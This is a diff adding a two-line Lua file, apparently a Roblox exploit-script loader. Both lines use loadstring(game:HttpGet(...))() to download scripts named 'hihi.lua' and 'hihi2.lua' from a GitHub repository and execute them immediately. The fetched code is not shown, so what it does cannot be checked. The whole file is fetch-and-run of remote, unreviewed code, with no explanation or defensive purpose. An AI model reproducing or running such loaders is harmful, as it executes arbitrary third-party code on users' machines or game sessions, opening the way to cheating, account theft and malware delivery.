@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dngw77/kinang/refs/heads/main/hihi.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/dngw77/kinang/refs/heads/main/hihi2.lua'))()
